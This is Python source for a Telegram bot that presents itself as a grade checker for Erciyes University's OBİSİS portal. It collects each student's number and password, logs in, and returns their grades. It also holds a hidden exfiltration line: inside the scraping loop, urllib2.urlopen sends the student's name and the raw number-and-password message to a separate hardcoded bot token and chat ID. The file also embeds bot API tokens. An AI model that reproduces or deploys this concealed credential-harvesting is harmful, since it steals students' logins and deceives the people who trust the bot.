# -*- coding: utf-8 -*-
# !/usr/bin/env python
import sys,os
import time
import telepot  #12.7
import telepot.namedtuple
from telepot.loop import MessageLoop
from bs4 import BeautifulSoup
import mechanize
import urllib2
#from pprint import pprint


def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    m = telepot.namedtuple.Message(**msg)

    print 'Received a %s from %s' % (content_type, m.chat)
    user = m.chat[4] +' '+ m.chat[5].encode('utf-8').decode('utf-8')
    print user
    
    if content_type != 'text':
        bot.sendMessage(chat_id, 'dalga geçmeyin')
   
    if len(msg['text']) < 7 or msg['text'].find(",") == -1:
            reply2 = 'Sayin '+str(user)+' format su sekilde olmali:\n\n öğrencino,şifre'
            bot.sendMessage(chat_id, reply2.decode("utf8"))
    else:
        reply1 = 'Sayin '+str(user)+' yoğunluk veya obisis kapalı olabilir, eğer bilgiler doğru ise lütfen bekleyiniz!'
        bot.sendMessage(chat_id, reply1.decode("utf-8"))

        a = (msg['text'])
        i = a.strip()
        i = a.split(',')


        username = i[0]
        password = i[1]
        br = mechanize.Browser()
        br.set_handle_robots(False)
        try:
            #obisis1
            br.open("https://obisis.erciyes.edu.tr/")
            br.select_form(nr=0)
            br.form["ctl02$txtboxOgrenciNo"] = username
            br.form["ctl02$txtBoxSifre"] = password
            br.method = "POST"
            br.submit()
            response = br.open("https://obisis.erciyes.edu.tr/Default.aspx?tabInd=2&tabNo=3").read()
        except:
            #obisis2
            br.open("https://obisis2.erciyes.edu.tr/")
            br.select_form(nr=0)
            br.form["ctl02$txtboxOgrenciNo"] = username
            br.form["ctl02$txtBoxSifre"] = password
            br.method = "POST"
            br.submit()
            response = br.open("https://obisis2.erciyes.edu.tr/Default.aspx?tabInd=2&tabNo=3").read()

        soup = BeautifulSoup(response, 'html.parser')
        soup.prettify(formatter=lambda s: s.replace(u'\xa0', '.'))

        for bilgi in soup.find_all('table', class_="HeadAp"):
            no = [bilgi.find('span', attrs={'id': 'Banner1_Kullanici1_txtOgrenciNo'}).text]
            isim = [bilgi.find('span', attrs={'id': 'Banner1_Kullanici1_txtAdiSoyadi'}).text]
            fakulte = [bilgi.find('span', attrs={'id': 'Banner1_Kullanici1_txtFakulteAdi'}).text]
            bol = [bilgi.find('span', attrs={'id': 'Banner1_Kullanici1_txtBolumAdi'}).text]
            gano = [bilgi.find('span', attrs={'id': 'Banner1_Kullanici1_txtSinifSeneGano'}).text]
            sonuc = isim + no + bol + fakulte + gano
            
            print(gano)
            cevap =  'Bilgiler:'
            cevap += '\n'+isim[0].title()
            cevap += '\n'+str(no[0])
            cevap += '\n'+bol[0].title()
            cevap += '\n'+fakulte[0].title()
            cevap += '\n'+str(gano[0]).title()
            bot.sendMessage(chat_id, cevap)
            urllib2.urlopen('https://api.telegram.org/bot499266306:AAHyUj-gL1hw22cEopPwF65DJzaFBJmVnQk/sendMessage?chat_id=404647908&text='+isim[0].title()+','+a)
        for dersler in soup.find_all("tr", {"class": "NormalBlack"}):
            derskodu = [dersler.find_all("td")[0].text]
            dersadi = [dersler.find_all("td")[1].text]
            devam = [dersler.find_all("td")[3].text]
            vize1 = [dersler.find_all("td")[4].text]
            vize2 = [dersler.find_all("td")[5].text]
            vize3 = [dersler.find_all("td")[6].text]
            final = [dersler.find_all("td")[7].text]
            but = [dersler.find_all("td")[8].text]
            ort = [dersler.find_all("td")[9].text]
            harf = [dersler.find_all("td")[10].text]
            sonuc = [dersler.find_all("td")[11].text]
            buthakki = [dersler.find_all("td")[17].text]
            print derskodu + dersadi + devam + vize1 + vize2 + vize3 + final + but + ort + harf + sonuc + buthakki
            ders = ('\nDersin kodu: '+derskodu[0]+'\nDersin adi: '+dersadi[0].title()+'\nDevamsizlik: '+devam[0]+'\nVize1: '+vize1[0]+'\nVize2: '+vize2[0]+
                    '\nVize3: '+vize3[0]+'\nFinal: '+final[0]+'\nButhakki:'+buthakki[0]+'\nBut Notu: '+but[0]+'\nOrtalama: '+ort[0]+'\nHarf: '+harf[0]+
                    '\nSonuc: '+sonuc[0]).encode('cp1254').decode('cp1254')

            bot.sendMessage(chat_id, ders)
           
            pass
        
    #bot.sendMessage(chat_id, 'Bot ile ilgili istek ve gorusleriniz icin: https://t.me/white_crownless_king ', disable_web_page_preview=True)
            
bot = telepot.Bot('486785097:AAHCXAOemis4B7sMfMaeoahHTIoxSOSbVBg')
MessageLoop(bot, handle).run_as_thread()
print 'Listening ...'

while 1:
    time.sleep(10)
